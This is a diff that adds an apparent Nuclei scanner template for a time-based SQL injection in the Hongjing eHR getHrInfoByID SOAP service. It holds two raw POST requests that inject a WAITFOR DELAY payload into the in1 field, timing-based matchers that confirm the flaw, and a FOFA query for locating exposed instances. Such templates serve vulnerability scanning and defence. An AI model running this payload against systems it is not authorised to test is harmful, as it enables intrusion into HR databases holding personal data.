@@ -1,0 +1,72 @@
+id: poc-yaml-hjsoft-ehr-gethrinfobyid-sqli
+info:
+  name: 宏景eHR getHrInfoByID SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 宏景eHR
+  metadata:
+    finger: 宏景eHR
+    fofa: app="HJSOFT-HCM"
+
+http:
+  - raw:
+      - |
+        POST /servlet/XFireServlet/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        SOAPAction: """
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrp:getHrInfoByID>
+                 <hrp:in0>1</hrp:in0>
+                 <hrp:in1>1'WAITFOR DELAY '0:0:5</hrp:in1>
+                 <hrp:in2>1</hrp:in2>
+                 <hrp:in3>1</hrp:in3>
+                 <hrp:in4>1</hrp:in4>
+                 <hrp:in5>1</hrp:in5>
+                 <hrp:in6>1</hrp:in6>
+              </hrp:getHrInfoByID>
+           </soapenv:Body>
+        </soapenv:Envelope>
+      - |
+        POST /servlet/XFireServlet/HrpService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        SOAPAction: """
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrp:getHrInfoByID>
+                 <hrp:in0>1</hrp:in0>
+                 <hrp:in1>1'WAITFOR DELAY '0:0:8</hrp:in1>
+                 <hrp:in2>1</hrp:in2>
+                 <hrp:in3>1</hrp:in3>
+                 <hrp:in4>1</hrp:in4>
+                 <hrp:in5>1</hrp:in5>
+                 <hrp:in6>1</hrp:in6>
+              </hrp:getHrInfoByID>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "HrpService"
+          - "getHrInfoByIDResponse"
+          - "传入的KEY值有错误"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
